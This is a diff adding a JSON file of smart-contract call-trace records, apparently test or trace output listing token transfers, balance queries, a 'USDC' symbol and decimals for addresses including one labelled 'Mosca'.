+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "92216",
+        "args": "30000000000000000000 [3e19], 0, 2, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "91063",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1296",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "534561773399014778333 [5.345e20]"
+    },
+    {
+        "id": "553",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "534561773399014778333 [5.345e20]"
+    },
+    {
+        "id": "3271",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "4039",
+        "args": "0x92b7807bF19b7DDdf89b706143896d05228f3121, 1000100000000000000000 [1e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3293",
+        "args": "0x92b7807bF19b7DDdf89b706143896d05228f3121, 1000100000000000000000 [1e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "531",
+        "args": "0x92b7807bF19b7DDdf89b706143896d05228f3121",
+        "original_code": null,
+        "description": null,
+        "return_value": "13986341869234771473452036 [1.398e25]"
+    },
+    {
+        "id": "1296",
+        "args": "0x92b7807bF19b7DDdf89b706143896d05228f3121",
+        "original_code": null,
+        "description": null,
+        "return_value": "4583852424446402108678012 [4.583e24]"
+    },
+    {
+        "id": "553",
+        "args": "0x92b7807bF19b7DDdf89b706143896d05228f3121",
+        "original_code": null,
+        "description": null,
+        "return_value": "4583852424446402108678012 [4.583e24]"
+    },
+    {
+        "id": "1828",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"USDC\""
+    },
+    {
+        "id": "1082",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"USDC\""
+    },
+    {
+        "id": "1296",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "11228018226600985221667 [1.122e22]"
+    },
+    {
+        "id": "553",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "11228018226600985221667 [1.122e22]"
+    },
+    {
+        "id": "1076",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18"
+    },
+    {
+        "id": "336",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18"
+    }
+]
